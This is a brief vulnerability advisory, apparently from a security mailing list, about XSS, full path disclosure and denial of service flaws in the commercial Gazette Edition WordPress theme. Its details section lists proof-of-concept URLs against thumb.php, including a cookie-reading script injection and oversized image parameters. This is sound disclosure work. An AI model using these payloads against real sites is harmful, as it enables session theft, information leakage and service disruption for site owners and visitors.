Hello list!

I want to warn you about Cross-Site Scripting, Full path disclosure, Abuse
of Functionality and Denial of Service vulnerabilities in The Gazette
Edition theme for WordPress. It's commercial theme for WP by WooThemes.

-------------------------
Affected products:
-------------------------

Vulnerable are The Gazette Edition 2.9.4 and previous versions. XSS is
possible only in old versions of the theme. Recently in version The Gazette
Edition 2.9.5 most of these vulnerabilities were fixed (but there were still
left many not fixed FPD).

Details:
----------

XSS (WASC-08):

http://site/wp-content/themes/gazette/thumb.php?src=1%3Cbody%20onload=alert(document.cookie)%3E

Full path disclosure (WASC-13):

http://site/wp-content/themes/gazette/thumb.php?src=http://site

http://site/wp-content/themes/gazette/thumb.php?src=http://site/page.png&h=1&w=1111111

http://site/wp-content/themes/gazette/thumb.php?src=http://site/page.png&h=1111111&w=1

http://site/wp-content/themes/gazette/

And also tens of php-scripts of the theme in folder /gazette/ and all
subfolders.

About such AoF and DoS vulnerabilities I wrote in article Using of the sites
for attacks on other sites
(http://lists.grok.org.uk/pipermail/full-disclosure/2010-June/075384.html).

Beside folder /gazette/ in folder with themes, this theme also can be placed
in folder /gazette-dev/gazette/.
